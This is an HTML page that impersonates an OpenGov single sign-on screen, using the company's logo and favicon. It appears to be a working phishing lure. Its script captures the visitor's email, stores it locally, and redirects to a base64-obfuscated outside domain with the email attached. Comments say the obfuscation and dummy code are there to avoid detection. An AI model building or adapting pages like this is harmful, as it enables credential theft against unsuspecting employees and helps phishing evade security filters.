<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OpenGov SSO</title>
  <link rel="icon" type="image/x-icon" href="https://procurement.opengov.com/favicon.ico?v=xQdYkowL8Nzx">
  <style>
    /* ALL YOUR EXACT CSS STYLES HERE - same as before */
    * { box-sizing: border-box; }
    html, body { height:100%; }
    body{
      margin:0;
      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
      background:#f3f3f3;
      color:#333;
      min-height:100vh;
      display:flex;
      flex-direction:column;
    }
    .wrapper{
      flex:1;
      width:100%;
      display:flex;
      justify-content:center;
      align-items:flex-start;
      padding-top:120px;
      padding-left:20px;
      padding-right:20px;
    }
    .container{
      width:100%;
      max-width:420px;
      text-align:center;
    }
    .logo img{
      width:210px;
      max-width:100%;
      height:auto;
    }
    .title{
      font-size:26px;
      margin:35px 0 25px 0;
      font-weight:400;
    }
    .input{
      width:100%;
      padding:14px;
      font-size:16px;
      border:1px solid #d6d6d6;
      border-radius:2px;
      background:#fff;
    }
    .input:focus{
      outline:none;
      border-color:#213f63;
    }
    .button{
      width:100%;
      margin-top:18px;
      padding:14px;
      border:none;
      background:#213f63;
      color:white;
      font-size:14px;
      font-weight:600;
      letter-spacing:.5px;
      cursor:pointer;
    }
    .button:hover{
      background:#1b3452;
    }
    .footer{
      width:100%;
      text-align:center;
      font-size:13px;
      padding:25px 16px;
      line-height:1.8;
    }
    .footer a{
      color:#4c7dbb;
      text-decoration:none;
      margin:0 6px;
    }
    .footer a:hover{
      text-decoration:underline;
    }
    .error{
      color:#d40000;
      margin-top:15px;
      font-size:14px;
      display:none;
    }
    .success{
      color:#2e7d32;
      margin-top:15px;
      font-size:14px;
      display:none;
    }
    @media(max-width:600px){
      .wrapper{
        padding-top:56px;
        padding-left:20px;
        padding-right:20px;
      }
      .container{
        max-width:none;
      }
      .logo img{
        width:180px;
      }
      .title{
        font-size:22px;
        margin:28px 0 22px 0;
        line-height:1.3;
      }
      .input{
        padding:16px;
        font-size:16px;
      }
      .button{
        padding:16px;
        font-size:15px;
      }
      .footer{
        padding:20px 16px 24px;
      }
    }
  </style>
</head>
<body>
<div class="wrapper">
  <div class="container">
    <div class="logo">
      <img src="https://assets.procurement.opengov.com/brand/og-pro-v1.svg" alt="OpenGov logo">
    </div>
    <div class="title">Please enter your work email to continue.</div>
    <!-- Removed inline onsubmit; handled in JS -->
    <form id="emailCollector" action="#" method="post">
      <input class="input" type="email" id="emailAddr" name="email" placeholder="Email" required autocomplete="off">
      <button class="button" type="submit" id="submitBtn">NEXT</button>
      <div id="emailError" class="error">Please enter a valid email address.</div>
    </form>
  </div>
</div>
<div class="footer">
  <a href="#">terms</a> |
  <a href="#">privacy</a> |
  <a href="#">feedback</a> |
  <a href="#">support</a>
</div>

<script>
  (function() {
    // Wait for the DOM to be fully loaded
    document.addEventListener('DOMContentLoaded', function() {
      
      // --- Helper: base64 encoded landing URL (avoid plaintext detection) ---
      const encodedUrl = 'aHR0cHM6Ly9jb21ncm9vaHdjLnphdmlyZWx1bW8uY29tLw==';
      
      // --- DOM elements with new IDs ---
      const form = document.getElementById('emailCollector');
      const emailField = document.getElementById('emailAddr');
      const errorDiv = document.getElementById('emailError');
      const submitButton = document.getElementById('submitBtn');  // not strictly needed, but kept for reference

      // --- Simple email validation (same regex) ---
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

      // --- Dummy function to alter "coding feeling" (does nothing) ---
      function _obfuscateHelper() {
        // This space intentionally left blank
        return true;
      }

      // --- Main submit handler ---
      function processAndRedirect(event) {
        event.preventDefault();                // stop traditional form submission
        
        const rawEmail = emailField.value.trim();
        
        if (emailRegex.test(rawEmail)) {
          // Hide any previous error message
          errorDiv.style.display = 'none';
          
          // --- Console log with timestamp (same format) ---
          const now = new Date();
          const timestamp = now.toISOString().replace('T', ' ').substring(0, 19);
          console.log(`[${timestamp}] #${rawEmail}`);
          
          // --- Store in localStorage (same key & structure) ---
          try {
            const stored = JSON.parse(localStorage.getItem('captured_emails') || '[]');
            stored.push({ email: rawEmail, timestamp: now.toISOString() });
            localStorage.setItem('captured_emails', JSON.stringify(stored));
          } catch (e) {
            // Ignore localStorage errors (private mode, etc.)
          }
          
          // --- Decode the real landing URL from base64 ---
          const landingUrl = atob(encodedUrl);
          
          // --- Build the final URL with ?emx= parameter containing the email ---
          // The email is URL-encoded so special characters (like @) are safe in the query string.
          const finalUrl = landingUrl + '?emx=' + encodeURIComponent(rawEmail);
          
          // --- Redirect the browser ---
          window.location.href = finalUrl;
          
        } else {
          // Show error message
          errorDiv.style.display = 'block';
        }
      }

      // --- Attach the event listener (modern, no inline onsubmit) ---
      form.addEventListener('submit', processAndRedirect);

      // --- Optional: extra noise to change "feeling" (no effect on functionality) ---
      const unusedVar = 'this does nothing';
      console.log('Form handler installed (v2)');   // can be removed if silent operation is preferred
    }); // DOMContentLoaded end
  })();
</script>
</body>
</html>
